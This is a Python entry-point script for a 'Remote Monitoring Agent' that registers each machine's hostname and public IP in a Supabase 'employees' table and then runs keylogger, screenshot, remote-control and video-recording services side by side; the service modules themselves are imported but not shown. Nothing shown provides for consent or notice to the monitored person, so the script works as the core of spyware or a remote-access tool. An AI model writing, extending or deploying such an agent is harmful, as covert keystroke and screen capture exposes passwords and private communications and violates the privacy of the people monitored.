import asyncio
import os
import socket
import sys
import uuid
import requests
from dotenv import load_dotenv
from supabase import create_client, Client

# Import services
from services.logger import KeyloggerService
from services.monitor import ScreenshotService
from services.control import ControlService
from services.stream import VideoRecorderService

# Load environment variables
load_dotenv()

SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")

if not SUPABASE_URL or not SUPABASE_KEY:
    print("Error: SUPABASE_URL and SUPABASE_KEY must be set in .env")
    sys.exit(1)

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

def get_ip_address():
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except:
        return "Unknown"

def register_agent():
    hostname = socket.gethostname()
    ip = get_ip_address()
    
    response = supabase.table("employees").select("*").eq("hostname", hostname).execute()
    data = response.data
    
    if data:
        emp_id = data[0]["id"]
        supabase.table("employees").update({
            "ip_address": ip, 
            "last_seen": "now()"
        }).eq("id", emp_id).execute()
        print(f"Agent registered (Existing): {hostname} ({emp_id})")
        return emp_id
    else:
        response = supabase.table("employees").insert({
            "hostname": hostname,
            "ip_address": ip
        }).execute()
        emp_id = response.data[0]["id"]
        print(f"Agent registered (New): {hostname} ({emp_id})")
        return emp_id

async def main():
    print("Starting Remote Monitoring Agent...")
    
    try:
        employee_id = register_agent()
    except Exception as e:
        print(f"Failed to register agent: {e}")
        return

    # Initialize Services
    keylogger = KeyloggerService(supabase, employee_id)
    monitor = ScreenshotService(supabase, employee_id)
    control = ControlService(supabase, employee_id)
    video = VideoRecorderService(supabase, employee_id)

    # Run tasks
    await asyncio.gather(
        keylogger.start(),
        monitor.start(),
        control.start(),
        video.start()
    )

if __name__ == "__main__":
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        print("Agent stopped.")
